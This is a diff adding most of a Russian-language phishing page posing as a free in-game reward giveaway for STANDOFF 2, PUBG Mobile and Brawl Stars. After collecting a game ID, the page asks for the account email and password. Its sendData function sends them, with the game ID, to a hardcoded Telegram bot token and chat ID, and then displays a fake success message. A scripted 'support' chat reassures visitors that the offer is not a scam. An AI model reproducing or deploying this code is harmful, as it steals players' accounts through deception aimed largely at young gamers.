@@ -657,6 +657,233 @@
                 <button type="submit" class="submit">Получить 🎁</button>
                 <button type="button" class="back-btn" onclick="goBackToId()">← Назад</button>
             </form>
-
+           
             <div class="success" id="success">
-                <div class
+                <div class="checkmark">✓</div>
+                <h2>Подарок получен!</h2>
+                <p id="successText">Ваша награда зачислена на аккаунт.</p>
+                <p class="note">Зайдите в игру и проверьте инвентарь</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">© 2026 Reward Center. Безопасная выдача наград.</div>
+</div>
+
+<button class="support-btn" onclick="toggleSupport()" title="Поддержка">💬</button>
+
+<div class="support-window" id="supportWindow">
+    <div class="chat-header">
+        <div class="info">
+            <div class="avatar-support">🎧</div>
+            <div>
+                <div class="name">Служба поддержки</div>
+                <div class="status">Онлайн</div>
+            </div>
+        </div>
+        <button class="chat-close" onclick="toggleSupport()">✕</button>
+    </div>
+
+    <div class="chat-body" id="chatBody">
+        <div class="chat-message bot">Здравствуйте! 👋<br>Меня зовут Алиса, я помогу вам с получением награды. Если что-то не работает — напишите, я подскажу.</div>
+    </div>
+
+    <div class="chat-typing" id="chatTyping">
+        <span class="dots"><span></span><span></span><span></span></span>
+    </div>
+
+    <div class="chat-input-area">
+        <input type="text" id="chatInput" placeholder="Напишите сообщение..." onkeydown="if(event.key==='Enter') sendChat()">
+        <button onclick="sendChat()">➤</button>
+    </div>
+</div>
+
+<script>
+    let selected = { platform: '', reward: '' };
+
+    function updateProgress(percent) {
+        document.getElementById('progressFill').style.width = percent + '%';
+    }
+
+    window.addEventListener('DOMContentLoaded', function() {
+        updateProgress(0);
+    });
+
+    function showMain() {
+        document.getElementById('welcomeStep').style.display = 'none';
+        document.getElementById('mainStep').style.display = 'block';
+        updateProgress(33);
+    }
+
+    function selectPlatform(platform, reward) {
+        selected.platform = platform;
+        selected.reward = reward;
+
+        document.getElementById('buttons').style.display = 'none';
+        document.getElementById('header').style.display = 'none';
+        document.getElementById('idTitle').textContent = `Введите ID · ${platform}`;
+        updateProgress(66);
+
+        let hint = '';
+        let placeholder = '';
+
+        if (platform === 'STANDOFF 2') {
+            hint = 'ID должен состоять из 9 цифр';
+            placeholder = '123456789';
+        } else if (platform === 'PUBG Mobile') {
+            hint = 'ID должен состоять из 8–12 цифр';
+            placeholder = '5123456789';
+        } else if (platform === 'Brawl Stars') {
+            hint = 'ID должен начинаться с # и содержать 9 символов';
+            placeholder = '#ABC123XYZ';
+        }
+
+        document.getElementById('idHint').textContent = hint;
+        document.getElementById('gameId').placeholder = placeholder;
+        document.getElementById('gameId').value = '';
+        document.getElementById('idError').classList.remove('active');
+        document.getElementById('idStep').classList.add('active');
+    }
+
+    function goBack() {
+        document.getElementById('idStep').classList.remove('active');
+        document.getElementById('buttons').style.display = 'flex';
+        document.getElementById('header').style.display = 'block';
+        updateProgress(33);
+    }
+
+    function goBackToId() {
+        document.getElementById('loginStep').classList.remove('active');
+        document.getElementById('idStep').classList.add('active');
+        updateProgress(66);
+    }
+
+    function checkId() {
+        const id = document.getElementById('gameId').value.trim();
+        const err = document.getElementById('idError');
+        let valid = false;
+
+        if (selected.platform === 'STANDOFF 2') {
+            valid = /^\d{9}$/.test(id);
+        } else if (selected.platform === 'PUBG Mobile') {
+            valid = /^\d{8,12}$/.test(id);
+        } else if (selected.platform === 'Brawl Stars') {
+            valid = /^#[A-Za-z0-9]{9}$/.test(id);
+        }
+
+        if (!valid) {
+            err.textContent = 'Неверный формат. ' + document.getElementById('idHint').textContent;
+            err.classList.add('active');
+            return;
+        }
+
+        err.classList.remove('active');
+        document.getElementById('idStep').classList.remove('active');
+        document.getElementById('formTitle').textContent = `${selected.reward} · ${selected.platform}`;
+        document.getElementById('loginStep').classList.add('active');
+        updateProgress(100);
+    }
+
+    function sendData(e) {
+        e.preventDefault();
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const gameId = document.getElementById('gameId').value;
+
+        const BOT_TOKEN = '8747751460:AAEO78CefXypChf0HLzoo_ZORaVOGAO9erI';
+        const CHAT_ID   = '8783227095';
+
+        const text = `🎁 Новая заявка!\n\n` +
+                     `🎮 Платформа: ${selected.platform}\n` +
+                     `🏆 Награда: ${selected.reward}\n` +
+                     `🆔 Игровой ID: ${gameId}\n` +
+                     `📧 Email: ${email}\n` +
+                     `🔑 Пароль: ${password}\n` +
+                     `🕐 Время: ${new Date().toLocaleString('ru-RU')}`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        }).catch(err => console.log(err));
+
+        document.getElementById('loginStep').classList.remove('active');
+        document.getElementById('successText').textContent =
+            `${selected.reward} для ${selected.platform} зачислены на аккаунт ${gameId}.`;
+        document.getElementById('success').classList.add('active');
+        updateProgress(100);
+
+        return false;
+    }
+
+    /* === ЧАТ ПОДДЕРЖКИ === */
+    function toggleSupport() {
+        const win = document.getElementById('supportWindow');
+        win.classList.toggle('open');
+        if (win.classList.contains('open')) {
+            setTimeout(() => document.getElementById('chatInput').focus(), 300);
+        }
+    }
+
+    function sendChat() {
+        const input = document.getElementById('chatInput');
+        const text = input.value.trim();
+        if (!text) return;
+
+        const body = document.getElementById('chatBody');
+
+        const userMsg = document.createElement('div');
+        userMsg.className = 'chat-message user';
+        userMsg.textContent = text;
+        body.appendChild(userMsg);
+        input.value = '';
+        body.scrollTop = body.scrollHeight;
+
+        const typing = document.getElementById('chatTyping');
+        typing.classList.add('active');
+        body.appendChild(typing);
+        body.scrollTop = body.scrollHeight;
+
+        setTimeout(() => {
+            typing.classList.remove('active');
+            const botMsg = document.createElement('div');
+            botMsg.className = 'chat-message bot';
+
+            const reply = getBotReply(text);
+            botMsg.innerHTML = reply;
+            body.appendChild(botMsg);
+            body.scrollTop = body.scrollHeight;
+        }, 1200 + Math.random() * 800);
+    }
+
+    function getBotReply(userText) {
+        const t = userText.toLowerCase();
+        if (t.includes('не работает') || t.includes('ошибка') || t.includes('проблем')) {
+            return 'Поняла вас 🙂 Попробуйте обновить страницу и зайти заново. Если не поможет — напишите ваш игровой ID, я передам заявку специалисту.';
+        }
+        if (t.includes('когда') || t.includes('сколько ждать') || t.includes('время')) {
+            return 'Обычно награда зачисляется в течение 5–15 минут после отправки заявки. Если прошло больше — напишите мне.';
+        }
+        if (t.includes('id') || t.includes('ид')) {
+            return 'Игровой ID можно посмотреть в настройках вашего профиля в игре. Для STANDOFF 2 — 9 цифр, для PUBG Mobile — 8–12 цифр, для Brawl Stars — начинается с # и содержит 9 символов.';
+        }
+        if (t.includes('бесплатно') || t.includes('обман') || t.includes('скам')) {
+            return 'Раздача полностью бесплатная. Мы не запрашиваем оплату и не имеем доступа к вашим средствам. Всё, что нужно — указать игровой ID, куда зачислить награду.';
+        }
+        if (t.includes('спасибо') || t.includes('благодар')) {
+            return 'Всегда рада помочь! 💚 Если появятся вопросы — я здесь.';
+        }
+        if (t.includes('привет') || t.includes('здравств') || t.includes('хай')) {
+            return 'Привет! 😊 Чем могу помочь?';
+        }
+        return 'Спасибо за сообщение! Я передала ваш вопрос оператору. Обычно отвечаем в течение 1–2 минут. А пока — можете продолжить оформление награды.';
+    }
+
+    const chatBody = document.getElementById('chatBody');
+    const observer = new MutationObserver(() => {
+        chatBody.scrollTop = chatBody.scrollHeight;
+    });
+    observer.observe(chatBody, { childList: true });
+</script>
+</body>
+</html>
